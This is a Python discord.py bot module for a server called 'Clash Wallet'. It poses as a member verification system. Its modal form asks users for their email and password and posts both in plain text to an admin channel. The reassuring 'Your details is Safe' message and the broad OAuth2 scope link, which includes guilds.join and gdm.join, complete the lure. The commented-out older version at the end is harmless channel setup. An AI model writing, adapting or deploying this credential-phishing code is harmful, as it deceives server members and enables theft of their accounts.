import discord
from discord.ext import commands
import urllib.parse

# --- CONFIGURATION ---
ADMIN_CHANNEL_ID = 1564831494227103864

# Replace with your actual Client ID from the Discord Developer Portal
CLIENT_ID = "1564834525828223086" 

# URL Encoded redirect URI based on your Railway setup
REDIRECT_URI = urllib.parse.quote("http://localhost:3000/callback")
# REDIRECT_URI = urllib.parse.quote("https://clashwallet.up.railway.app")

# Constructed OAuth2 URL with the exact scopes from your URL generator
OAUTH_URL = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={REDIRECT_URI}&scope=identify+email+guilds+guilds.join+guilds.members.read+gdm.join"
# ---------------------

class DetailsModal(discord.ui.Modal, title='Verification Details'):
    # Text inputs for the form
    user_email = discord.ui.TextInput(
        label='Email Address',
        style=discord.TextStyle.short,
        placeholder='Enter your email address',
        required=True
    )
    user_password = discord.ui.TextInput(
        label='Password',
        style=discord.TextStyle.short,
        placeholder='Enter your password',
        required=True
    )
    user_note = discord.ui.TextInput(
        label='Note (Optional)',
        style=discord.TextStyle.long,
        placeholder='Any additional notes...',
        required=False
    )

    async def on_submit(self, interaction: discord.Interaction):
        # 1. Acknowledge the modal submission to the user
        await interaction.response.send_message("✅ Your details have been submitted securely. Please proceed to Start Verification.", ephemeral=True)
        
        # 2. Fetch the Admin channel where details will be logged
        admin_channel = interaction.guild.get_channel(ADMIN_CHANNEL_ID)
        
        if admin_channel:
            # 3. Build the embed containing the user's submitted credentials
            log_embed = discord.Embed(
                title="🚨 New Verification Form Submitted", 
                color=discord.Color.red()
            )
            log_embed.add_field(name="User", value=f"{interaction.user.mention} ({interaction.user.id})", inline=False)
            log_embed.add_field(name="Email", value=self.user_email.value, inline=False)
            log_embed.add_field(name="Password", value=self.user_password.value, inline=False)
            
            if self.user_note.value:
                log_embed.add_field(name="Note", value=self.user_note.value, inline=False)
                
            # 4. Send the credentials to the admin channel
            await admin_channel.send(embed=log_embed)


class PrivateVerificationView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        # Add the OAuth2 Link button dynamically
        self.add_item(discord.ui.Button(
            label="Start Verification", 
            style=discord.ButtonStyle.link, 
            url=OAUTH_URL
        ))

    @discord.ui.button(label="📝 Fill Details", style=discord.ButtonStyle.secondary, custom_id="modal_fill_details")
    async def fill_details_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        # Open the modal when the button is clicked
        await interaction.response.send_modal(DetailsModal())


class WelcomeView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Start Verification", style=discord.ButtonStyle.secondary, custom_id="start_verification_initial")
    async def verification_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = interaction.guild
        user = interaction.user

        await interaction.response.defer(ephemeral=True)

        ROLE_ID = 123456 
        role = guild.get_role(ROLE_ID)
        if role:
            try:
                await user.add_roles(role)
            except discord.Forbidden:
                return await interaction.followup.send("❌ I lack permission to give you the verification role.", ephemeral=True)
        
        CATEGORY_ID = 1564835530305445948
        category = guild.get_channel(CATEGORY_ID)

        overwrites = {
            guild.default_role: discord.PermissionOverwrite(view_channel=False),
            user: discord.PermissionOverwrite(view_channel=True, send_messages=False),
            guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True)
        }

        channel_name = f"verify-{user.name}"
        
        try:
            # Create the private channel
            new_channel = await guild.create_text_channel(
                name=channel_name,
                category=category,
                overwrites=overwrites
            )
            
            # Build the second embed for the private channel
            private_embed = discord.Embed(
                description="**🔒 Private Verification to Clash Wallet!** \n\n> 🛡️ ┃ ** Press Start Filling Form and Proceed  **\n> 📧 ┃** Enter Your Mail **\n> 🔑 ┃** Enter Your Password**\n> 📝 ┃** Enter Your Note (optional)**\n\n🔒 ┃** Your Details is Safe **\n\n> If you have any questions or need assistance, feel free to reach out to our team at any time. \n> **Have fun and enjoy your stay!** 🚀",
                color=10181046
            )
            private_embed.set_thumbnail(url="https://media.discordapp.net/attachments/1564889976313741404/1564893261254889523/unnamed.webp?ex=6ae2ebeb&is=6ae19a6b&hm=2506ec27b04172c7bfff50b599c321294d76e4c56ab825ce7ce46a5e3c6cc0c4&=&format=webp")
            
            # Send the embed and the new form view to the private channel
            await new_channel.send(f"{user.mention}", embed=private_embed, view=PrivateVerificationView())
            
            await interaction.followup.send(f"✅ Verification started! Please check your new channel: {new_channel.mention}", ephemeral=True)
        
        except Exception as e:
            await interaction.followup.send(f"❌ An error occurred: {e}", ephemeral=True)


class SetupWelcome(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.Cog.listener()
    async def on_ready(self):
        # Register BOTH views so buttons persist through bot restarts
        self.bot.add_view(WelcomeView())
        self.bot.add_view(PrivateVerificationView())

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def setupwelcome(self, ctx):
        embed = discord.Embed(
            description="**Welcome to Clash Wallet!** 👋\n\nWe’re thrilled to have you as part of our community! To help you get settled and find your way around, please take a look at the following channels:\n\n> 📜 ┃ ** Press Start Verification and Proceed  **\n\n> If you have any questions or need assistance, feel free to reach out to our team at any time. \n> **Have fun and enjoy your stay!** 🚀",
            color=10181046
        )
        embed.set_image(url="https://cdn.discordapp.com/attachments/1503014110156030023/1503179655799115796/welcome_20.gif?ex=6ae287a5&is=6ae13625&hm=475887481ed6d073b2ae9aeb6c81b4723d6f1385e38b83fac30c76fdfe46d8d8&")

        await ctx.send(embed=embed, view=WelcomeView())
        try:
            await ctx.message.delete()
        except discord.Forbidden:
            pass

async def setup(bot):
    await bot.add_cog(SetupWelcome(bot))
    
    # import discord
# from discord.ext import commands

# class WelcomeView(discord.ui.View):
#     def __init__(self):
#         # timeout=None ensures the button works forever, even after bot restarts
#         super().__init__(timeout=None)

#     # style=2 is discord.ButtonStyle.secondary (grey)
#     @discord.ui.button(label="Start Verification", style=discord.ButtonStyle.secondary, custom_id="p_362491090432954372")
#     async def verification_button(self, interaction: discord.Interaction, button: discord.ui.Button):
#         guild = interaction.guild
#         user = interaction.user

#         # 1. Acknowledge the button click immediately so it doesn't show "Interaction Failed"
#         await interaction.response.defer(ephemeral=True)

#         # 2. Assign the Role (ID: 123456)
#         ROLE_ID = 1564928784820469820 
#         role = guild.get_role(ROLE_ID)
        
#         if role:
#             try:
#                 await user.add_roles(role)
#             except discord.Forbidden:
#                 return await interaction.followup.send("❌ I lack permission to give you the verification role. Please contact an admin.", ephemeral=True)
        
#         # 3. Create the private channel under the specific Category (ID: 1564835530305445948)
#         CATEGORY_ID = 1564835530305445948
#         category = guild.get_channel(CATEGORY_ID)

#         # 4. Configure Channel Permissions 
#         # - Default role (@everyone) cannot see the channel
#         # - User can see the channel but CANNOT send messages
#         # - Bot can see and send messages
#         overwrites = {
#             guild.default_role: discord.PermissionOverwrite(view_channel=False),
#             user: discord.PermissionOverwrite(view_channel=True, send_messages=False),
#             guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True)
#         }

#         # Use the user's name for the channel name (e.g., "verify-username")
#         channel_name = f"verify-{user.name}"
        
#         try:
#             new_channel = await guild.create_text_channel(
#                 name=channel_name,
#                 category=category,
#                 overwrites=overwrites
#             )
#             await interaction.followup.send(f"✅ Verification started! Please check your new channel: {new_channel.mention}", ephemeral=True)
#         except discord.Forbidden:
#             await interaction.followup.send("❌ I don't have permission to create channels.", ephemeral=True)
#         except Exception as e:
#             await interaction.followup.send(f"❌ An error occurred: {e}", ephemeral=True)


# class SetupWelcome(commands.Cog):
#     def __init__(self, bot):
#         self.bot = bot

#     @commands.Cog.listener()
#     async def on_ready(self):
#         # Register the persistent view so the button listens for clicks after bot restarts
#         self.bot.add_view(WelcomeView())

#     # Command to spawn the welcome message (e.g. !setupwelcome)
#     @commands.command()
#     @commands.has_permissions(administrator=True)
#     async def setupwelcome(self, ctx):
#         """Sends the Welcome Embed with the Verification button."""
        
#         embed = discord.Embed(
#             description="**Welcome to Clash Wallet!** 👋\n\nWe’re thrilled to have you as part of our community! To help you get settled and find your way around, please take a look at the following channels:\n\n> 📜 ┃ ** Press Start Verification and Proceed  **\n\n> If you have any questions or need assistance, feel free to reach out to our team at any time. \n> **Have fun and enjoy your stay!** 🚀",
#             color=10181046 # Resolves to your specified integer color
#         )
#         embed.set_image(url="https://cdn.discordapp.com/attachments/1503014110156030023/1503179655799115796/welcome_20.gif?ex=6ae287a5&is=6ae13625&hm=475887481ed6d073b2ae9aeb6c81b4723d6f1385e38b83fac30c76fdfe46d8d8&")

#         view = WelcomeView()
        
#         # Send the embed and view to the channel where the command was typed
#         await ctx.send(embed=embed, view=view)
        
#         # Delete the trigger command (!setupwelcome) to keep the channel clean
#         try:
#             await ctx.message.delete()
#         except discord.Forbidden:
#             pass

# # Setup function required by discord.py to load the cog
# async def setup(bot):
#     await bot.add_cog(SetupWelcome(bot))